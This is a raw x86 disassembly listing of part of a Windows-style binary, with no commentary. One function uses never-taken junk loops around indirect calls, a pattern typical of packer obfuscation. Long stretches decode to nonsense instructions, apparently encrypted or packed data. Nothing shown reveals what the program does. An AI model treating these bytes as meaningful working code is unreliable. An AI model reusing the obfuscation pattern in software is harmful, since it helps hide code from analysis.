  421f0b:	xchg   edx,eax
  421f0c:	push   ebp
  421f0d:	cmc    
  421f0e:	aas    
  421f0f:	cld    
  421f10:	cmp    eax,0x1ee31da8
  421f15:	into   
  421f16:	in     eax,dx
  421f17:	xor    BYTE PTR ds:0x5da42b82,bh
  421f1d:	xor    DWORD PTR [edi],ebp
  421f1f:	loop   0x421f30
  421f21:	pop    ss
  421f22:	imul   edx,DWORD PTR [esi+edi*8+0x5f],0x42cbc4ee
  421f2a:	xchg   edx,eax
  421f2c:	mov    eax,0x689c91fd
  421f31:	pop    ebp
  421f32:	cmp    esp,ecx
  421f34:	bound  edx,QWORD PTR [si]
  421f37:	pop    es
  421f38:	into   
  421f39:	rol    esp,cl
  421f3b:	add    al,0x70
  421f3d:	xchg   ebp,eax
  421f3e:	dec    ebp
  421f3f:	xlat   BYTE PTR ds:[ebx]
  421f40:	lods   eax,DWORD PTR ds:[esi]
  421f41:	clc    
  421f42:	mov    ds:0xf0d58c16,al
  421f47:	aad    0x96
  421f49:	je     0x421f79
  421f4b:	mov    edx,0x41e98c5e
  421f50:	mov    BYTE PTR [edi-0x2b07e64],bl
  421f56:	fnsave [esi]
  421f58:	bound  esp,QWORD PTR [esi]
  421f5a:	bound  edx,QWORD PTR [edx+ecx*8-0x528012e8]
  421f61:	mov    cl,BYTE PTR [ebx+0x23]
  421f64:	loopne 0x421f6a
  421f66:	jo     0x421f15
  421f68:	dec    ebp
  421f69:	pop    eax
  421f6a:	mov    dl,0x98
  421f6c:	sub    DWORD PTR [ecx+0x6d],esi
  421f6f:	mov    BYTE PTR [esi],dh
  421f71:	out    0x5b,eax
  421f73:	jecxz  0x421f00
  421f75:	dec    ebp
  421f76:	or     BYTE PTR [ebx-0x37cc07ab],cl
  421f7c:	xor    edx,eax
  421f7e:	sub    ecx,edx
  421f80:	sub    ecx,esi
  421f82:	xor    ecx,eax
  421f84:	mov    DWORD PTR [ebp+0x8],ecx
  421f87:	mov    ecx,DWORD PTR [ebp+0x8]
  421f8a:	mov    edx,DWORD PTR [ebp-0x58]
  421f8d:	add    ecx,0x5708fa
  421f93:	imul   ecx,edx
  421f96:	mov    DWORD PTR [ebp-0x58],ecx
  421f99:	mov    ecx,DWORD PTR [ebp+0x8]
  421f9c:	mov    edx,DWORD PTR [ebp-0x54]
  421f9f:	add    ecx,0x64f898
  421fa5:	or     ecx,edx
  421fa7:	mov    DWORD PTR [ebp-0x54],ecx
  421faa:	mov    ecx,DWORD PTR [ebp+0x8]
  421fad:	mov    edx,DWORD PTR [ebp-0x50]
  421fb0:	add    ecx,0x242ebc9
  421fb6:	xor    ecx,edx
  421fb8:	mov    DWORD PTR [ebp-0x50],ecx
  421fbb:	mov    ecx,DWORD PTR [ebp+0x8]
  421fbe:	mov    edx,DWORD PTR [ebp-0x4c]
  421fc1:	add    ecx,edi
  421fc3:	and    ecx,edx
  421fc5:	mov    DWORD PTR [ebp-0x4c],ecx
  421fc8:	mov    ecx,DWORD PTR [ebp+0x8]
  421fcb:	mov    edx,DWORD PTR [ebp-0x48]
  421fce:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421fd5:	mov    DWORD PTR [ebp-0x48],ecx
  421fd8:	mov    ecx,DWORD PTR [ebp+0x8]
  421fdb:	mov    edx,0xfa5e1524
  421fe0:	sub    edx,ecx
  421fe2:	add    edx,DWORD PTR [ebp-0x44]
  421fe5:	mov    DWORD PTR [ebp-0x44],edx
  421fe8:	mov    ecx,DWORD PTR [ebp+0x8]
  421feb:	xor    ecx,eax
  421fed:	add    ecx,esi
  421fef:	jne    0x421f74
  421ff5:	mov    ecx,DWORD PTR [ebp-0x8]
  421ff8:	xor    ecx,eax
  421ffa:	mov    eax,DWORD PTR [ebp+0x10]
  421ffd:	add    ecx,esi
  421fff:	mov    DWORD PTR [eax],ecx
  422001:	pop    edi
  422002:	pop    esi
  422003:	pop    ebx
  422004:	leave  
  422005:	ret    0xc
  422008:	push   ebp
  422009:	mov    ebp,esp
  42200b:	sub    esp,0x78
  42200e:	and    DWORD PTR ds:0x42a26e,0x0
  422018:	jmp    0x42202a
  42201d:	mov    ecx,DWORD PTR ds:0x42a26e
  422023:	inc    ecx
  422024:	mov    DWORD PTR ds:0x42a26e,ecx
  42202a:	cmp    DWORD PTR ds:0x42a26e,0x18
  422031:	jae    0x422079
  422037:	cmp    DWORD PTR ds:0x42a26e,0x4
  42203e:	ja     0x422079
  422044:	jmp    0x42205a
  422049:	push   DWORD PTR [ebp-0x14]
  42204c:	push   0x3437
  422051:	push   DWORD PTR [ebp-0x10]
  422054:	call   DWORD PTR ds:0x42a3da
  42205a:	cmp    DWORD PTR ds:0x42a26e,0x3
  422061:	jne    0x422074
  422067:	mov    ecx,DWORD PTR ds:0x42a26e
  42206d:	inc    ecx
  42206e:	mov    DWORD PTR ds:0x42a26e,ecx
  422074:	jmp    0x42201d
  422079:	push   esi
  42207a:	push   edi
  42207b:	and    DWORD PTR ds:0x42a2d2,0x0
  422085:	jmp    0x422097
  42208a:	mov    edi,DWORD PTR ds:0x42a2d2
  422090:	inc    edi
  422091:	mov    DWORD PTR ds:0x42a2d2,edi
  422097:	cmp    DWORD PTR ds:0x42a2d2,0x1c
  42209e:	jae    0x4220f2
  4220a4:	cmp    DWORD PTR ds:0x42a2d2,0xb
  4220ab:	jle    0x4220f2
  4220b1:	jmp    0x4220d3
  4220b6:	push   0x87a7
  4220bb:	push   0x2194
  4220c0:	push   0x6620
  4220c5:	push   DWORD PTR [ebp-0x24]
  4220c8:	push   0x42a25e
  4220cd:	call   DWORD PTR ds:0x42a3de
  4220d3:	cmp    DWORD PTR ds:0x42a2d2,0xa
  4220da:	jne    0x4220ed
  4220e0:	mov    edi,DWORD PTR ds:0x42a2d2
  4220e6:	inc    edi
  4220e7:	mov    DWORD PTR ds:0x42a2d2,edi
  4220ed:	jmp    0x42208a
  4220f2:	mov    eax,ds:0x42941e
  4220f7:	adc    ecx,esi
  4220f9:	mov    DWORD PTR [ebp-0x24],eax
  4220fc:	mov    DWORD PTR ds:0x42a27a,0x1f
  422106:	cmp    DWORD PTR ds:0x42a27a,0x0
  42210d:	je     0x422145
  422113:	cmp    DWORD PTR ds:0x42a27a,0x24
  42211a:	ja     0x422145
  422120:	jmp    0x422133
  422125:	push   DWORD PTR [ebp-0x20]
  422128:	push   0x807a
  42212d:	call   DWORD PTR ds:0x42a3e2
  422133:	mov    ecx,DWORD PTR ds:0x42a27a
  422139:	dec    ecx
  42213a:	mov    DWORD PTR ds:0x42a27a,ecx
  422140:	jmp    0x422106
  422145:	mov    eax,ds:0x42953e
  42214a:	and    DWORD PTR ds:0x42a2e2,0x0
  422154:	jmp    0x422168
  422159:	xor    edi,edi
  42215b:	xor    edi,DWORD PTR ds:0x42a2e2
  422161:	inc    edi
  422162:	mov    DWORD PTR ds:0x42a2e2,edi
  422168:	cmp    DWORD PTR ds:0x42a2e2,0x19
  42216f:	jae    0x422197
  422175:	cmp    DWORD PTR ds:0x42a2e2,0x1e
  42217c:	jge    0x422197
  422182:	jmp    0x422192
  422187:	push   0x2c0a
  42218c:	call   DWORD PTR ds:0x42a3ea
  422192:	jmp    0x422159
  422197:	mov    DWORD PTR [ebp-0x30],eax
  42219a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4221a1:	sbb    DWORD PTR ds:0x42a25a,edx
  4221a7:	mov    DWORD PTR [ebp-0x28],0xf89c85ba
  4221ae:	mov    DWORD PTR ds:0x42a27a,0x1d
  4221b8:	cmp    DWORD PTR ds:0x42a27a,0x0
  4221bf:	je     0x422218
  4221c5:	cmp    DWORD PTR ds:0x42a27a,0xf
  4221cc:	jge    0x422218
  4221d2:	jmp    0x4221ec
  4221d7:	push   0x8cd0
  4221dc:	push   0x429247
  4221e1:	push   0x429247
  4221e6:	call   DWORD PTR ds:0x42a3b6
  4221ec:	cmp    DWORD PTR ds:0x42a27a,0x10
  4221f3:	jne    0x422206
  4221f9:	mov    ecx,DWORD PTR ds:0x42a27a
  4221ff:	dec    ecx
  422200:	mov    DWORD PTR ds:0x42a27a,ecx
  422206:	mov    ecx,DWORD PTR ds:0x42a27a
  42220c:	dec    ecx
  42220d:	mov    DWORD PTR ds:0x42a27a,ecx
  422213:	jmp    0x4221b8
  422218:	mov    eax,DWORD PTR [ebp-0x10]
  42221b:	and    DWORD PTR ds:0x42a256,0x0
  422225:	jmp    0x422237
  42222a:	mov    esi,DWORD PTR ds:0x42a256
  422230:	inc    esi
  422231:	mov    DWORD PTR ds:0x42a256,esi
  422237:	cmp    DWORD PTR ds:0x42a256,0x14
  42223e:	jae    0x42226b
  422244:	cmp    DWORD PTR ds:0x42a256,0x1b
  42224b:	jl     0x42226b
  422251:	jmp    0x422266
  422256:	push   0x42913d
  42225b:	push   0x400000
  422260:	call   DWORD PTR ds:0x42a3ba
  422266:	jmp    0x42222a
  42226b:	mov    ecx,DWORD PTR [ebp-0x10]
  42226e:	mov    DWORD PTR ds:0x42a25e,0x2ef8
  422278:	sub    eax,ecx
  42227a:	and    DWORD PTR ds:0x42a2c2,0x0
  422284:	mov    edi,DWORD PTR ds:0x42a2c2
  42228a:	inc    edi
  42228b:	mov    DWORD PTR ds:0x42a2c2,edi
  422291:	cmp    DWORD PTR ds:0x42a2c2,0x7
  422298:	jbe    0x4222e0
  42229e:	jmp    0x4222b9
  4222a3:	push   DWORD PTR [ebp-0x1c]
  4222a6:	push   DWORD PTR [ebp-0x24]
  4222a9:	push   0x5955
  4222ae:	push   0x5167
  4222b3:	call   DWORD PTR ds:0x42a3be
  4222b9:	cmp    DWORD PTR ds:0x42a2c2,0x6
  4222c0:	jne    0x4222d3
  4222c6:	mov    edi,DWORD PTR ds:0x42a2c2
  4222cc:	inc    edi
  4222cd:	mov    DWORD PTR ds:0x42a2c2,edi
  4222d3:	cmp    DWORD PTR ds:0x42a2c2,0x13
  4222da:	jb     0x422284
  4222e0:	mov    DWORD PTR [ebp-0x10],eax
  4222e3:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4222ea:	mov    eax,DWORD PTR [ebp-0x18]
  4222ed:	mov    ecx,DWORD PTR [ebp-0x18]
  4222f0:	sub    eax,ecx
  4222f2:	mov    DWORD PTR [ebp-0x18],eax
  4222f5:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4222fc:	mov    eax,DWORD PTR [ebp-0xc]
  4222ff:	mov    ecx,DWORD PTR [ebp-0xc]
  422302:	sub    eax,ecx
  422304:	mov    DWORD PTR [ebp-0xc],eax
  422307:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  42230e:	mov    eax,DWORD PTR [ebp-0x1c]
  422311:	mov    ecx,DWORD PTR [ebp-0x1c]
  422314:	sub    eax,ecx
  422316:	mov    DWORD PTR [ebp-0x1c],eax
  422319:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  422320:	mov    eax,DWORD PTR [ebp-0x20]
  422323:	mov    ecx,DWORD PTR [ebp-0x20]
  422326:	sub    eax,ecx
  422328:	mov    DWORD PTR [ebp-0x20],eax
  42232b:	mov    eax,DWORD PTR [ebp-0x2c]
  42232e:	mov    ecx,DWORD PTR [ebp-0x20]
  422331:	mov    esi,0x75108aa
  422336:	xor    eax,esi
  422338:	mov    edi,0x3272f1
  42233d:	add    eax,edi
  42233f:	or     eax,ecx
  422341:	jmp    0x42333c
  422346:	mov    dl,0x1f
  422348:	xlat   BYTE PTR ds:[ebx]
  422349:	and    edx,edx
  42234b:	mov    eax,ds:0xbec98882
  422350:	js     0x422396
  422352:	fld    QWORD PTR [edx]
  422354:	jmp    0x7cd44efb
  422359:	and    DWORD PTR [ecx-0x47c7c8e],0x7b
  422360:	cmp    al,0x5c
  422362:	div    ah
  422364:	xchg   ecx,eax
  422365:	loop   0x4222fd
  422367:	iret   
  422368:	repz xchg ebp,eax
  42236a:	pop    edx
  42236b:	(bad)  
  42236c:	mov    ch,0xae
  42236e:	push   0x68
  422370:	cmp    eax,0x49649d9f
  422375:	in     al,dx
  422376:	xlat   BYTE PTR ds:[ebx]
  422377:	cmp    BYTE PTR [ecx+0xe],bl
  42237a:	(bad)  
  42237b:	push   edx
  42237c:	enter  0x76a2,0xba
  422380:	lds    ebx,FWORD PTR [ecx]
  422382:	push   ss
  422383:	stc    
  422384:	and    BYTE PTR [edx+ebx*4],bh
  422387:	aas    
  422388:	sbb    al,0x34
  42238a:	xchg   esp,eax
  42238b:	dec    edx
  42238c:	cmp    edi,DWORD PTR [ebx-0x3a]
  42238f:	cmc    
  422390:	imul   ebx,esp,0xc530fd7
  422396:	cmp    BYTE PTR [edi],dl
  422398:	bnd jo 0x4223eb
  42239b:	out    0x3,al
  42239d:	xchg   ebp,eax
  42239e:	repnz xlat BYTE PTR ds:[ebx]
  4223a0:	jmp    0xc21d:0x4818e3ee
  4223a7:	(bad)  
  4223a9:	xor    esp,DWORD PTR [ecx]
  4223ab:	mov    al,0x97
  4223ad:	dec    ebx
  4223ae:	sub    eax,0x4fa409bb
  4223b3:	mov    al,ds:0x4583796a
  4223b8:	or     BYTE PTR [edx-0x50adf176],ch
  4223be:	mov    ds:0xaebb4e21,al
  4223c3:	lea    eax,[ebp+0x2f]
  4223c6:	and    BYTE PTR [ebp+0x18],ah
  4223c9:	icebp  
  4223ca:	dec    ecx
  4223cb:	push   cs
  4223cc:	sbb    DWORD PTR [eax+0x30edfc8e],ecx
  4223d2:	sub    DWORD PTR [ecx+0x3cb8888b],esi
  4223d8:	outs   dx,BYTE PTR ds:[esi]
  4223d9:	test   ah,al
  4223db:	xchg   esp,eax
  4223dc:	addr16 in eax,0xf7
  4223df:	repz mov ch,0xe0
  4223e2:	dec    edx
  4223e3:	mov    dh,0x7f
  4223e5:	mov    cl,0x91
  4223e7:	bound  ebp,QWORD PTR [eax]
  4223e9:	arpl   WORD PTR [edi+0x641757f8],di
  4223ef:	pop    esi
  4223f0:	mov    esi,0xcce2b6cf
  4223f5:	jne    0x4223d4
  4223f7:	ss loope 0x422396
  4223fa:	lods   eax,DWORD PTR ds:[esi]
  4223fb:	arpl   si,di
  4223fd:	(bad)  
  4223fe:	adc    ah,BYTE PTR [esi+0x703abeea]
  422404:	leave  
  422405:	and    ch,BYTE PTR [esp+ebx*8]
  422408:	mov    esi,DWORD PTR [ebx-0x295f5ea3]
  42240e:	js     0x422440
  422410:	add    eax,0x18583b38
  422415:	cwde   
  422416:	pop    edx
  422417:	sbb    DWORD PTR [ebx+0x36],esi
  42241a:	xor    bl,bh
  42241c:	xchg   esp,eax
  42241d:	xchg   esi,eax
  42241e:	sub    ebp,DWORD PTR [edx-0x60]
  422421:	retf   
  422422:	jnp    0x422404
  422424:	mov    ch,0x9a
  422426:	adc    edi,DWORD PTR [esi-0x52f4ef6]
  42242c:	and    ebx,DWORD PTR [ebp+0x12]
  42242f:	xlat   BYTE PTR ds:[ebx]
  422431:	push   edi
  422432:	pop    edx
  422433:	bound  edx,QWORD PTR [ecx+0x79]
  422436:	aad    0x76
  422438:	in     eax,0xe7
  42243a:	xor    eax,0xd51283db
  42243f:	fsub   st(5),st
  422441:	mov    ebx,0x9bca5236
  422446:	test   al,0x3d
  422448:	push   es
  422449:	(bad)  
  42244a:	mov    ds:0x4140f21e,eax
  42244f:	mov    ch,0x6b
  422451:	pop    ss
  422452:	cmp    eax,0xe777a2f5
  422457:	in     al,dx
  422458:	inc    esp
  422459:	jp     0x42244b
  42245b:	in     eax,dx
  42245c:	or     BYTE PTR [ecx-0x50dd67c],dl
  422462:	fsubr  QWORD PTR [edi+0x2]
  422465:	enter  0x12ff,0x44
  422469:	mov    dh,0x46
  42246b:	cmp    al,0x76
  42246d:	imul   eax,DWORD PTR [edx-0x74],0xffffffb3
  422471:	xchg   ebx,eax
  422472:	imul   dh
  422474:	sub    DWORD PTR [ebx],0x4b
  422477:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422478:	cwde   
  422479:	ins    BYTE PTR es:[edi],dx
  42247a:	sub    DWORD PTR [ecx+eax*8+0x3f871de3],edx
  422481:	and    DWORD PTR ds:0x70a0c744,edi
  422487:	add    DWORD PTR [eax+0xc656111],ecx
  42248d:	inc    ecx
  42248e:	mov    ebp,0x76879d32
  422493:	lock cld 
  422495:	push   es
  422496:	push   eax
  422497:	sti    
  422498:	sub    cl,BYTE PTR [eax+0x16fd6e21]
  42249e:	addr16 rcl esi,1
  4224a1:	outs   dx,BYTE PTR ds:[esi]
  4224a2:	jae    0x42244c
  4224a4:	out    dx,al
  4224a5:	push   esi
  4224a6:	je     0x4224fd
  4224a8:	ror    eax,1
  4224aa:	shr    DWORD PTR [edi],cl
  4224ac:	mov    cl,BYTE PTR [ebp-0x5f07cba1]
  4224b2:	mov    dl,BYTE PTR ds:0xef251798
  4224b8:	stos   DWORD PTR es:[edi],eax
  4224b9:	mov    BYTE PTR [ecx],ah
  4224bb:	daa    
  4224bc:	fistp  DWORD PTR [esi]
  4224be:	mov    ds:0xce12131c,eax
  4224c3:	js     0x4224af
  4224c5:	cdq    
  4224c6:	ins    DWORD PTR es:[edi],dx
  4224c7:	mov    dh,0xd3
  4224c9:	pushf  
  4224ca:	sbb    DWORD PTR [edx+0x659eaba3],eax
  4224d0:	sub    DWORD PTR [edx],ebp
  4224d2:	ja     0x42251c
  4224d4:	and    eax,0x4dcc31dd
  4224d9:	gs fwait
  4224db:	or     eax,0x4c0ce57f
  4224e0:	gs jbe 0x42247c
  4224e3:	shl    DWORD PTR [ebx-0x51],1
  4224e6:	dec    BYTE PTR [eax-0x79ebb9d0]
  4224ec:	xchg   edx,eax
  4224ed:	retf   0x884a
  4224f0:	popa   
  4224f1:	jmp    FWORD PTR [ebx+eax*1]
  4224f4:	add    edi,eax
  4224f6:	test   DWORD PTR [edi+0x52d14236],ebp
  4224fc:	aaa    
  4224fd:	push   es
  4224fe:	xchg   esp,eax
  4224ff:	(bad)  
  422500:	jecxz  0x422529
  422502:	lahf   
  422503:	js     0x4224b9
  422505:	aad    0xdf
  422507:	and    BYTE PTR [ebp*2-0x5ea21a3],ch
  42250e:	popa   
  42250f:	jl     0x4224d5
  422511:	out    0x78,al
  422513:	test   DWORD PTR [eax-0xdb1de3a],esi
  422519:	call   0x12cd3236
  42251e:	add    eax,0x867071bd
  422523:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422524:	mov    ebx,0xc1a47473
  422529:	into   
  42252a:	daa    
  42252b:	and    ecx,ebx
  42252d:	and    edx,DWORD PTR [ecx-0x60d3c316]
  422533:	sub    eax,0x3fb557c7
  422538:	cmp    ch,BYTE PTR [ebx-0x28c131b0]
  42253e:	clc    
  42253f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422540:	sub    ecx,DWORD PTR [ebx-0x1c]
  422543:	pop    ecx
  422544:	je     0x42256b
  422546:	int3   
  422547:	adc    ebx,0x7f
  42254a:	daa    
  42254b:	imul   edi,DWORD PTR ds:0xadf0ca0d,0xffffffce
  422552:	adc    eax,0x12aaba53
  422557:	push   eax
  422558:	jmp    0x1d8df8b
  42255d:	mov    dh,0x82
  42255f:	pop    ebp
  422560:	test   al,0xa0
  422562:	inc    esi
  422563:	xchg   ebx,eax
  422564:	mov    fs,WORD PTR [ebx-0x68]
  422567:	mov    ds:0x37ff9ea0,eax
  42256c:	mov    esp,0x8e5237fd
  422571:	jmp    0x4225e5
  422573:	sbb    eax,0x60
  422576:	lods   eax,DWORD PTR ds:[esi]
  422577:	mov    cl,BYTE PTR [eax+0x351f8449]
  42257d:	mov    ch,0xdf
  42257f:	mov    edx,0x65b44ddf
  422584:	retf   0x8d98
  422587:	pusha  
  422588:	stc    
  422589:	popf   
  42258a:	mov    eax,0xafe7406e
  42258f:	mov    al,0x45
  422591:	sbb    al,0xea
  422593:	push   0x23
  422595:	stc    
  422596:	jb     0x4225f7
  422598:	mov    edi,0x72b3b1c9
  42259d:	sub    esi,DWORD PTR [eax-0x5541bc61]
  4225a3:	shl    BYTE PTR [edx+0x3f76bea7],0xfc
  4225aa:	hlt    
  4225ab:	test   eax,0xceba84a1
  4225b0:	push   esp
  4225b1:	aad    0xdf
  4225b3:	ror    BYTE PTR [edi-0x6867ab9c],0x76
  4225ba:	retf   
  4225bb:	(bad)  
  4225bc:	mov    edi,0x4651bf37
  4225c1:	fs add edi,esp
  4225c4:	xchg   edx,esi
  4225c6:	stos   BYTE PTR es:[edi],al
  4225c7:	jns    0x9561c120
  4225cd:	arpl   ax,cx
  4225cf:	test   eax,0x755ee34e
  4225d4:	push   0x915fb59c
  4225d9:	ins    DWORD PTR es:[edi],dx
  4225da:	ja     0x4225a6
  4225dc:	and    al,0x47
  4225de:	sub    al,0xf
  4225e0:	enter  0xd3b5,0xb2
  4225e4:	jae    0x4225de
  4225e6:	fdivr  DWORD PTR [edx-0x21ca2471]
  4225ec:	adc    cl,bh
  4225ee:	retf   0x651c
  4225f1:	int    0x0
  4225f3:	pop    ebx
  4225f4:	lea    eax,[ecx+0x7d010d7c]
  4225fa:	lahf   
  4225fb:	pop    esi
  4225fc:	lds    esp,FWORD PTR [edi-0x58]
  4225ff:	idiv   DWORD PTR [esi+0x3b6e5624]
  422605:	lods   al,BYTE PTR ds:[esi]
  422606:	cmp    esi,esi
  422608:	and    DWORD PTR [ecx-0x6a],0x37d0f0be
  42260f:	inc    esp
  422610:	fild   QWORD PTR [ecx+edi*2-0x45b6c9ec]
  422617:	jg     0x4225bf
  422619:	mov    ecx,DWORD PTR [eax+0xd]
  42261c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261d:	outs   dx,BYTE PTR ds:[esi]
  42261e:	scas   eax,DWORD PTR es:[edi]
  42261f:	inc    esi
  422620:	sub    al,BYTE PTR [edx+0x48]
  422623:	xor    eax,0x2efdf82d
  422628:	jns    0x42265b
  42262a:	jp     0x422622
  42262c:	lea    esp,[esi*2+0x484b88a2]
  422633:	jmp    0x4226ad
  422635:	adc    al,0xf0
  422637:	stos   BYTE PTR es:[edi],al
  422638:	mov    esi,0xc5e39385
  42263d:	xchg   BYTE PTR [ebp+0x68],al
  422640:	scas   eax,DWORD PTR es:[edi]
  422641:	out    0x9,eax
  422643:	push   esp
  422644:	dec    eax
  422645:	in     eax,0x27
  422647:	cwde   
  422648:	loope  0x42265c
  42264a:	(bad)  
  42264b:	mov    bl,0x32
  42264d:	loopne 0x422677
  42264f:	test   al,0xce
  422651:	mov    dh,0xf
  422653:	jmp    0x92b1accf
  422658:	pop    eax
  422659:	fnstenv [ecx-0x2e4b26fd]
  42265f:	jmp    0xffde3d07
  422664:	mov    al,0xa
  422666:	iret   
  422667:	jnp    0x4225ec
  422669:	pop    eax
  42266a:	inc    edx
  42266b:	shr    BYTE PTR [esi+0x4922c33a],1
  422671:	cmp    DWORD PTR [edi-0x30],edx
  422674:	dec    esp
  422675:	(bad)  
  422676:	or     bh,al
  422678:	xor    dh,BYTE PTR [esi+0x2d]
  42267b:	test   DWORD PTR [ebx-0x16],ebp
  42267e:	jle    0x42262a
  422680:	fnstenv [edx+edx*2+0x4c9e8d93]
  422687:	xchg   edi,eax
  422688:	jg     0x4226ac
  42268a:	test   DWORD PTR [edx],esi
  42268c:	jnp    0x42265d
  42268e:	imul   edx,DWORD PTR [ebx+eax*8+0xc1d7657],0x4f06593a
  422699:	mov    ebp,0x9d7a394c
  42269e:	arpl   dx,bp
  4226a0:	popa   
  4226a1:	sbb    DWORD PTR [eax-0x63],ecx
  4226a4:	cld    
  4226a5:	fild   WORD PTR [edx-0x62]
  4226a8:	sub    eax,DWORD PTR [ebp+0x1e]
  4226ab:	xchg   esp,eax
  4226ac:	pop    esi
  4226ad:	or     eax,0x22bb321b
  4226b2:	fsubp  st(0),st
  4226b4:	pop    edx
  4226b5:	inc    ebx
  4226b6:	(bad)  
  4226b7:	sti    
  4226b8:	xchg   ecx,eax
  4226b9:	ins    DWORD PTR es:[edi],dx
  4226ba:	cmp    DWORD PTR [edx+eiz*2+0x1f],esp
  4226be:	int    0xd3
  4226c0:	push   ebx
  4226c1:	aad    0x1a
  4226c3:	ss dec eax
  4226c5:	dec    ebp
  4226c6:	push   ds
  4226c7:	sbb    al,0x55
  4226c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ca:	push   cs
  4226cb:	dec    edx
  4226cc:	loopne 0x42272a
  4226ce:	dec    edi
  4226cf:	add    DWORD PTR [esi-0x41],0xa6ab2393
  4226d6:	dec    ecx
  4226d7:	cli    
  4226d8:	hlt    
  4226d9:	xchg   edi,eax
  4226da:	pop    esp
  4226db:	ret    
  4226dc:	add    al,0xfd
  4226de:	mov    ?,WORD PTR [eax+0x1c]
  4226e1:	jno    0x422699
  4226e3:	mov    edx,0x5a249af6
  4226e8:	adc    ah,BYTE PTR [ebx]
  4226ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226ec:	pop    ebx
  4226ed:	inc    ebp
  4226ee:	(bad)  
  4226ef:	and    BYTE PTR [ecx-0x19f0c137],dh
  4226f5:	es adc ah,0xcc
  4226f9:	out    dx,al
  4226fa:	xchg   edi,eax
  4226fb:	div    DWORD PTR [ecx*8-0x51aaa624]
  422702:	(bad)  [esp+esi*4+0x679d1a3d]
  422709:	pusha  
  42270a:	inc    ebx
  42270b:	push   cs
  42270c:	xor    cl,ch
  42270e:	cmp    dl,BYTE PTR [ebx+0x60]
  422711:	iret   
  422712:	div    BYTE PTR [ebx+ecx*1+0x1bf9a864]
  422719:	test   al,0x4e
  42271b:	in     al,dx
  42271c:	adc    al,0xff
  42271e:	sti    
  42271f:	pop    ds
  422720:	push   eax
  422721:	xchg   ecx,eax
  422722:	dec    ebp
  422723:	mov    edi,DWORD PTR [edx-0x45]
  422726:	push   ecx
  422727:	mov    ds:0x3afd91d,eax
  42272c:	cmp    eax,0x13f101db
  422731:	(bad)  
  422732:	push   esp
  422733:	mov    dl,0x5a
  422735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422736:	jle    0x4226eb
  422738:	aad    0x62
  42273a:	jg     0x42274a
  42273c:	ud2    
  42273e:	xchg   ecx,eax
  42273f:	push   ebx
  422740:	das    
  422741:	mov    bl,0x3c
  422743:	(bad)  
  422745:	mov    ecx,DWORD PTR [edi+edx*8+0x1c10c539]
  42274c:	pop    es
  42274d:	leave  
  42274e:	and    dh,BYTE PTR [esi-0x2]
  422751:	dec    esp
  422752:	push   0x79c3cb8d
  422757:	lock lock push ds
  42275a:	repnz pop ebp
  42275c:	add    DWORD PTR [ebp-0x2d],eax
  42275f:	pop    ss
  422760:	pop    es
  422761:	jle    0x4226ed
  422763:	adc    eax,0x59eba9da
  422768:	pop    edi
  422769:	hlt    
  42276a:	add    esp,DWORD PTR ds:0x3fbb9af8
  422770:	out    0xd,al
  422772:	mov    ecx,0x7ba31725
  422777:	and    ebp,ebx
  422779:	addr16 cs leave 
  42277c:	xchg   esi,eax
  42277d:	dec    eax
  42277e:	lods   eax,DWORD PTR ds:[esi]
  42277f:	imul   eax,DWORD PTR [edx-0x7a34c73b],0xffffffa1
  422786:	fcmovnb st,st(6)
  422788:	mov    bh,0x16
  42278a:	mov    ds:0x8d8338ea,eax
  42278f:	sbb    DWORD PTR [ebp-0x4e682bc5],ebx
  422795:	jo     0x4227bc
  422797:	push   edi
  422798:	add    dh,cl
  42279a:	jmp    0x123c4d8
  42279f:	cdq    
  4227a0:	fnclex 
  4227a2:	inc    ebp
  4227a3:	stos   BYTE PTR es:[edi],al
  4227a4:	mov    ss,WORD PTR [ebx]
  4227a6:	test   BYTE PTR [edi],cl
  4227a8:	pop    ecx
  4227a9:	lock test BYTE PTR [eax-0x6489234a],dh
  4227b0:	dec    ebp
  4227b1:	mov    bh,0xdb
  4227b3:	push   ebp
  4227b4:	(bad)  
  4227b5:	jmp    0xa83783c7
  4227ba:	call   0xb7c4:0x9141dd02
  4227c1:	and    bh,dl
  4227c3:	(bad)  
  4227c4:	xor    al,0xb7
  4227c6:	pop    ebx
  4227c7:	test   eax,eax
  4227c9:	push   edi
  4227ca:	ins    BYTE PTR es:[edi],dx
  4227cb:	cmp    al,0x5c
  4227cd:	(bad)  
  4227cf:	xchg   edi,eax
  4227d0:	sbb    edx,ecx
  4227d2:	cdq    
  4227d3:	mov    esi,0x3bb69809
  4227d8:	sub    eax,DWORD PTR [eax-0x5c]
  4227db:	ret    0xd8d5
  4227de:	js     0x42281a
  4227e0:	in     al,0x77
  4227e2:	aas    
  4227e3:	sub    DWORD PTR [ebx+0x2f177050],edi
  4227e9:	lock daa 
  4227eb:	cmp    ah,BYTE PTR [edx+edx*8+0x12]
  4227ef:	(bad)  
  4227f0:	jnp    0x422778
  4227f2:	je     0x422821
  4227f4:	lock push esp
  4227f6:	and    al,0xcb
  4227f8:	add    cl,BYTE PTR [eax+0x41]
  4227fb:	test   DWORD PTR [edx+0x5],eax
  4227fe:	xchg   edi,eax
  4227ff:	sahf   
  422800:	cmp    al,bl
  422802:	pop    ecx
  422803:	xchg   DWORD PTR [edx+0xa],esp
  422806:	(bad)  
  422808:	ds mov ds,ebp
  42280b:	data16 lahf 
  42280d:	inc    ebx
  42280e:	sbb    DWORD PTR ds:0xcd7e0a1a,0x29
  422815:	out    dx,al
  422816:	in     al,dx
  422817:	jbe    0x422807
  422819:	imul   edx,edx,0xffffffe8
  42281c:	xor    eax,0x848fb45e
  422821:	aaa    
  422822:	lods   eax,DWORD PTR ds:[esi]
  422823:	aas    
  422824:	sti    
  422825:	ror    ebp,1
  422827:	mov    ds:0x91b5357,eax
  42282c:	stc    
  42282d:	ja     0x422837
  42282f:	pop    ss
  422830:	lods   al,BYTE PTR ds:[esi]
